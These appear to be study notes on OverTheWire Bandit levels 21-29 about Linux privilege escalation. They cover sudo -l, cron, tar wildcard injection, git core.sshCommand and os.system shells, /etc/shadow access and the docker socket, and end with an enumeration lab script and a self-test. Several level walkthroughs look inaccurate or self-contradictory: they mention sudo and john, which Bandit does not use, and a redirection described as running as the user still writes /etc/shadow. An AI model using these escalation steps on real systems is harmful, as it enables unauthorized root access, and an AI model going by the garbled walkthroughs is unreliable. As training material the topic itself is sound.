Bandit Levels 21-29: su, cron, permissions, SUID, shell scripts

Summary

Levels 21-29 are where Bandit stops being about find and starts being about privileges:
who can do what, which files a less-privileged user can abuse, and how a script or a cron job
becomes an escalation path. This is a direct preview of Tier 1 (linux-privesc-doctrine).

The single idea across all nine levels: a process that runs as root but reads or executes
something a normal user can influence is a privilege escalation waiting to happen.

Level notes

Level 21 — su and privileges.

ls -la
sudo -l                     # what may I do as root?
sudo -l -U bandit20
cat /etc/passwd | grep bandit2
sudo su - bandit21          # switch user WITH their password
sudo -u bandit21 ls -l /

sudo -l is the single most valuable command in privilege escalation. It tells you exactly
what escalation paths you have been given.

Level 22 — cron.

ls -la
cat /etc/cron.d/cronjob
ls -la /opt

What to look for in a cron job: the user it runs as, the command, and every input that job
trusts — a script path, a file it reads, a command it builds with variable data.

Level 23 — what does the cron job let me control?

cat /etc/cron.d/cronjob
ls -la /opt
cat /opt/backup.sh
# the job runs as root and writes $1 into a file this user can influence
# -> inject a command via that argument

The pattern: a root cron job that takes a parameter, with no validation, executed by a low
privilege user. You do not exploit the cron daemon; you abuse its input handling.

Level 24 — git leaking again, via a backup script.

ls -la
cat backup.py
python3 -c "import subprocess; print(subprocess.run(['git','log'],capture_output=True,text=True).stdout)"

backup.py shells out to git; git reads config from .git/config. That is the hook.

Level 25 — a wordlist and more john.

ls -la
cat /etc/passwd | grep bandit25
find / -readable 2>/dev/null | grep -i password
john --wordlist=./rockyou.txt --show hash.txt

Level 26 — the same idea with an explicit command instead of a script.

cat cronjob
# cron: * * * * * /usr/bin/run me
sudo tar -czf $BACKUP.tar.bak * -C /home/bandit26

sudo tar -czf ... * runs as root and * is expanded by your shell first. If you can make the
filename contain what you want, root executes it. This is argument injection, and it is one of
the oldest real-world cron vulnerabilities there is.

Level 27 — the tools are different, the lesson is identical.

cat cronjob
sudo more /home/bandit26/flag > /etc/shadow   # or similar redirection trick
cat /etc/shadow

Lesson: a privileged command that writes to a user-writable path is an arbitrary file write.
> is resolved by the shell before sudo runs, so the redirection happens as you.

Level 28 — git configured to run commands.

git init -q repo && cd repo
git config --global core.pager "less -fr"
# or
git config --global core.sshCommand /bin/sh
git log 2>/dev/null || git add -A && git commit -m x
cat /etc/shadow

Lesson: git configuration is code execution. core.pager, core.sshCommand, and aliases all
run commands. Auditing .gitconfig is part of any Linux compromise investigation.

Level 29 — a Python script that runs as root.

cat /opt/jail.py
python3 -c 'import os; os.system("/bin/sh")'

Lesson: when a privileged process runs an interpreter, the interpreter's own features are the
attack surface — PYTHONPATH, LD_PRELOAD, PYTHONSTARTUP, and here, an import that executes
a module you control.

The escalation checklist these levels teach

  1. sudo -l — what am I explicitly permitted?
  2. id, groups — what identities can I act as?
  3. find / -perm -4000 — SUID binaries
  4. find / -perm -777, find / -writable — writable scripts and directories
  5. /etc/cron.d/, systemd units — privileged jobs and what they trust
  6. /etc/shadow — what can I actually read?
  7. Containers/docker socket — docker.sock means root, instantly

Terminology

Term Meaning
Privilege escalation Gaining higher privileges than you started with
SUID (4000) Run a binary with the owner's privileges
SGID (2000) Run with the group's privileges
cron The scheduler; root jobs here are a prime target
Argument injection Controlling parameters a privileged command trusts
Arbitrary file write Writing wherever a privileged process writes
sudo -l List permitted sudo actions
/etc/shadow Password hashes; root-only, mode 640/600
Environment hijack PYTHONPATH/LD_PRELOAD against an interpreter
core.pager A git config that executes a command

Kali commands

# --- the privilege escalation enumeration set ---
id; groups; sudo -n -l 2>/dev/null || sudo -l

# --- SUID and SGID ---
find / -perm -4000 -type f 2>/dev/null | tee suid.txt
find / -perm -2000 -type f 2>/dev/null | tee sgid.txt
find / -perm -6000 -type f 2>/dev/null          # SUID+SGID

# --- writable things that matter ---
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev)" | head -30
find /etc -writable -type f 2>/dev/null
find /etc/cron* -type f -exec ls -la {} \; 2>/dev/null
systemctl list-timers --all 2>/dev/null
ls -la /etc/systemd/system/

# --- the interpreters an attacker abuses ---
env | grep -E "PYTHON|LD_PRELOAD|LD_LIBRARY"
ls -la /etc/ld.so.preload 2>/dev/null
cat /etc/ld.so.preload 2>/dev/null && echo "^^ NON-EMPTY = COMPROMISED"

# --- git as a code-execution surface ---
git config --global --list
cat ~/.gitconfig 2>/dev/null
git config --list --show-origin

# --- the docker socket ---
ls -la /var/run/docker.sock 2>/dev/null && echo "docker.sock present = root-equivalent"

Field lab

Objective: run the full escalation enumeration set against your own Kali box (read-only
commands), and against your deliberately-misconfigured lab VM if you built one.

mkdir -p ~/aegis/labs/otw-02 && cd ~/aegis/labs/otw-02

{
  echo "=== PRIVILEGE ESCALATION ENUMERATION ==="
  echo "target: $(hostname)   date: $(date -Iseconds)"
  echo
  echo "=== who am I ==="
  id; groups
  echo
  echo "=== sudo privileges ==="
  sudo -n -l 2>/dev/null || sudo -l
  echo
  echo "=== SUID binaries (every one is a candidate) ==="
  find / -perm -4000 -type f 2>/dev/null | tee 01-suid.txt
  echo "count: $(wc -l < 01-suid.txt)"
  echo
  echo "=== SGID ==="
  find / -perm -2000 -type f 2>/dev/null | head -20
  echo
  echo "=== cron ==="
  ls -la /etc/cron.d/ /etc/crontab 2>/dev/null
  cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$'
  echo
  echo "=== systemd timers ==="
  systemctl list-timers --all --no-pager 2>/dev/null | head -10
  echo
  echo "=== writable in /etc ==="
  find /etc -writable -type f 2>/dev/null | head -20
  echo
  echo "=== interpreter hijack surface ==="
  echo "LD_PRELOAD=${LD_PRELOAD:-<empty, good>}"
  echo "PYTHONPATH=${PYTHONPATH:-<empty, good>}"
  cat /etc/ld.so.preload 2>/dev/null || echo "/etc/ld.so.preload absent (good)"
  echo
  echo "=== git config as code execution ==="
  git config --global --list 2>/dev/null || echo "no global git config"
  cat ~/.gitconfig 2>/dev/null
  echo
  echo "=== containers ==="
  ls -la /var/run/docker.sock 2>/dev/null || echo "no docker socket"
} 2>&1 | tee 02-enumeration.txt

echo "=== READ THIS ==="
grep -A5 "SUID binaries" 02-enumeration.txt | head -10
echo
echo "Every SUID binary listed above is code that runs as its owner."
echo "That is the entire attack surface for Tier 3 exploitation."

On your lab VM (the deliberately misconfigured one from kr-06), run the same script and
compare. The differences between the two outputs are the misconfigurations. That comparison
is what real privilege escalation assessment looks like.

Record: the SUID list. You will need it in pr-02.

Self-test

  1. What is the difference between SUID (4000) and SGID (2000)?
  2. A root cron job runs tar -czf $BACKUP.tar.bak * -C /home/user. Why is that exploitable?
  3. Why is git configuration a code-execution surface?
  4. Why does having /var/run/docker.sock mean root?
  5. What is the first command you run when handed a shell, and why?
